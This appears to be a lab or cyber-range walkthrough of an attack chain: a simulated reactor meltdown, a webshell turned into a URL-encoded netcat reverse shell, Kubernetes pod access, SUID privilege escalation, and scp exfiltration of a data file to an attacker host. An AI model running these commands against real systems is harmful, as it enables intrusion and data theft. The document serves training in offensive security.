# Actions on Objectives

- [Actions on Objectives](#actions-on-objectives)
  - [Objective 1: Nuclear Meltdown](#objective-1-nuclear-meltdown)
  - [Neighbour Discovery](#neighbour-discovery)
  - [Privilege Escalation - Data-Deployment-b](#privilege-escalation---data-deployment-b)
  - [Local Enumeration - Sensitive Pod](#local-enumeration---sensitive-pod)
  - [Actions On Objective 2 - Exfiltrate the secret file](#actions-on-objective-2---exfiltrate-the-secret-file)

----

Recalling the objectives:

> 1. Cause Nuclear Meltdown (detrimental-state)<br/>
> 2. Exfiltrate critical information on one of the air-gapped networks

<br/>


## Objective 1: Nuclear Meltdown

Follow the instruction found on the jump-server:

```
Code Control > Malfunctions > set option 12 (Inadvertent Rod Withdrawl)


Modify Delay Time (5)
Failure Fraction (100)
Check the active box 


Then, RUN the application, in 5 seconds, a message "OVERFlow" appears.
```

![picture 49](images/a7a09238b6408f1f735fe11096d8602e2435559a6c9d2f290981ab9fbed006c1.png)  

![picture 50](images/25d8469c2d0921658b4240fa9e7ce7fd43ac0ad9aebff0f82faf013b01cd6b6b.png)  

<br/>

## Neighbour Discovery

On the remote desktop, use `arp -a` to discovery neighbour:

![picture 51](images/9c203adda88234c4626b4c5f83bb35b7d37119b1167fb73b66eb998eb38f92f3.png)  

Use `ping` to discover the network `10.2.1.0/24`:

```
FOR /L %i IN (1,1,254) DO ping -n 1 10.2.1.%i | FIND /i "Reply">>c:\users\administrator\desktop\ipaddresses.txt
```

![picture 52](images/ade5bb35dad0eb3d5582c1d82bc36702baf7f60ab0636d2784b869ea09f3df82.png)  

- `10.2.1.2` and `10.2.1.3` are alive hosts.

<br/>

Try to access 10.2.1.2 using browser:

![picture 53](images/665ccaee4bd6ed1b5b8d8f11ea38e5e711ecfd36e7be9e4cbfe0d05435c47094.png)  

- The PHP page is using `system()` command.

<br/>

Try to append `?cmd=id`:

![picture 54](images/3e1669177763f2a5effd07282f2ddc54d38b2c5660346d32f8e26271ffdde27f.png)  

- As shown, the `id` command is executed. We can use this webshell to get a reverse shell

<br/>

On the attacker machine:

```
nc -nlvp 443
```

On the RDP, make the following request:

```
http://10.2.1.2/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.100.11%204443%20%3E%2Ftmp%2Ff 
```

![picture 55](images/7a3035e73b469a51d299964d868e673c39ac7e193916079ea9a31e6be70931d4.png)  

![picture 56](images/43cc2ab0f84529647bbd7e22cc7deb7987bb1e51eeb031d320a3827af43213f0.png)  

As shown, a reverse shell calls back.

<br/>

## Privilege Escalation - Data-Deployment-b

Checking the mount, it is a kubernetes host:

```
mount
```

![picture 57](images/0af2b579f86ebd371322a2a37ee188426e84884da3075fd19f757ece24843c7c.png)  

<br/>

Since we are in Kubernetes environment, we can use `kubectl` to enuemrate the K8S environment:

```
cd /tmp && curl http://192.168.100.11/kubectl -o /tmp/kubectl
```

![picture 58](images/30effe4ffef84b8acc9dfdb721a49e2c63b5aa6a712bd9193caa281e2f989e88.png)  


<br/>

Enumerate PODS on the K8S environment:

```
chmod +x kubectl
```

```
./kubectl get pods
```

![picture 59](images/7cf72ff7a4fc37a31c9bac5a4a5b62ff5d976d154386d53f747ae574517b52a6.png)  

<br/>

Try to access `sensitive-pod`:

```
./kubectl exec -it sensitive-pod /bin/bash
```

![picture 60](images/b9dd3eee4e64750668fe8e945cd079ed70d1c05ec2d629c8422f7ff6a95fb4bf.png)  

- As shown, we can access the sensitive-pod as root.

<br/>

## Local Enumeration - Sensitive Pod

Check the mount related to the Kubernetes host:

```
mount | grep sda
```

![picture 61](images/6008fd59e6f05b7c480a5eb22021dcf0a10d418a89082058dd54cc55d8b7e424.png)  

- The host mount is on `/root` in this pod

<br/>

Checking `/root`, it is in fact structured like a linux system:

```
ls /root
```

![picture 62](images/fe23975e420ca58831cca4f4502bd06ac14173cb7635da4e71c953d6c5c7ed58.png)  

<br/>

Enumerating the home folder, found the following path with an ssh key and remote access information:

![picture 63](images/5c03278ef7c044ebf8fe82a0d95d3e56c68686e0bda5a61635b4687ac0f71b68.png)  

<br/>

Check the hosts file `/root/etc/hosts`:

```
cat /root/etc/hosts
```

![picture 64](images/72cfa554cc3cfe77c48047cd670955aca132aefc02fb7faa48b14d91678c9996.png)  

- data-master = `10.2.1.2`

<br/>

Try to SSH to `10.2.1.2` using the private key `id_rsa`:

```
ssh -i id_rsa data-master@10.2.1.2
```

![picture 65](images/0fdeeebd7d852406d16620b1a13b4b7667aec098fe7dcfaccdb1dcb0259d64c2.png)  

<br/>

## Actions On Objective 2 - Exfiltrate the secret file

Checking the data-master home directory, there is a file `cron.sh`.

![picture 66](images/13a3e09e60c0e5d20deca2465ba4829053ed0bc47072a1014636135764d56016.png)  

<br/>

Checking `/tmp/bash`, it is with SUID and owned by `root`. 

```
ls -l /tmp/
```

![picture 67](images/6e13b83053d4fa58940c66c7ce40640fd2c842f4a24812f1c0b747b19675eea8.png)  

<br/>

We can use this to become root:

```
/tmp/bash -p
```

![picture 68](images/7f40ec4e803a7481861e2c146bb363588343bdffbad0faf916eb670de72e0a9c.png)  

<br/>

Checking the `/root` directory, `Critical-Data.xlsx` is found:

![picture 69](images/d708b1700d62e8eb04e18cb9a10dc4cb3fb412410c644a5f596854d2f773b653.png)  

<br/>

To exfiltrate, use `scp`:

```
md5sum Critical-Data.xlsx && scp /root/Critical-Data.xlsx root@192.168.100.11:/tmp/Critical-Data.xlsx
```

![picture 70](images/e26f043269cc60f9917ba68fb1e91d341d10cfd6277be71ded7725c62c1a293b.png)  

<br/>

Check the file on the attacker host:

```
md5sum Critical-Data.xlsx
```

![picture 71](images/4cc7b1dcd0887a8122d37219c1c8064e835b8ccea89257fa3f22c806f861a772.png)  

- As shown, the md5 of the received file is the same as the one on `data-master`.

<br/>

Inspect the content of `Critical-Data.xlsx`:

![picture 72](images/7f81d2fedbd207d1c212754e4ab06d57b9a2a2cf915caf795d8980283b14e0be.png)  

